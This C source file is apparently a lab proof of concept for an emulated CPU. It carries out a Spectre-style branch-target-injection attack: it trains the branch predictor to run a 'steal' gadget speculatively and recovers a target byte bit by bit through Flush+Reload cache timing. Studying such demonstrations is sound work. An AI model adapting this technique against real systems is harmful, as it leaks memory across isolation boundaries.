
#include "cpuemu.h"

// Address whose contents we leak.
#define TARGET_PTR ((void *)0xdeadbeef)

// Flush+Reload side channel array.
#define TIMING_ARRAY ((volatile unsigned char *)0x100000)

// To widen the speculative window, the vulnerable jump's address is loaded
// from just-flushed memory.
typedef void (*callback)(void *, int);
callback next_callback;

// Helper: Determine whether the given address is in the cache.
static int is_cached(volatile void *address) {
    int before = rdcycle();
    fence();
    *(volatile char *)address;
    fence();
    int after = rdcycle();
    return after - before < 16;
}

// This function is executed speculatively to leak the pointee of TARGET_PTR.
void steal(void *ptr, int shift) {
    // Spectre gadget: Extract a single bit from the byte *ptr.
    int value = *(unsigned char *)ptr;
    // We shift left such that the resulting number is immediately usable for
    // addressing different cache lines.
    value <<= shift;
    value &= 256;
    // Since TIMING_ARRAY is volatile, this causes a memory load even if the
    // result of the load is not used.
    TIMING_ARRAY[value];
}

// This dummy function is executed architecturally instead of steal().
void nop(void *ptr, int number) {}

// This function contains the exploited jump instruction.
// It invokes the next_callback defined above with the given arguments.
__attribute__((noinline))
void call_callback(void *ptr, int number) {
    next_callback(ptr, number);
}

int main(void) {
    // Dummy value to read during the training cycles.
    unsigned char dummy = 0;
    // Ultimate result.
    unsigned char result = 0;
    // Loop counter. We extract the value bit for bit because there are not
    // enough distinct cache lines to check 256 addresses without potentially
    // evicting what we are looking for.
    int shift;

    for (shift = 1; shift <= 8; shift++) {
        // Train BTB predict a call to steal() next time.
        next_callback = steal;
        call_callback(&dummy, 0);

        // Main attack: Architecturally calls nop(), speculatively executes
        // steal().
        fence();
        next_callback = nop;
        flushall();
        call_callback(TARGET_PTR, shift);
        fence();

        // Extract the bit stored in the side channel.
        int next_bit = is_cached(&TIMING_ARRAY[256]);
        result |= next_bit << (8 - shift);
    }

    return result;
}
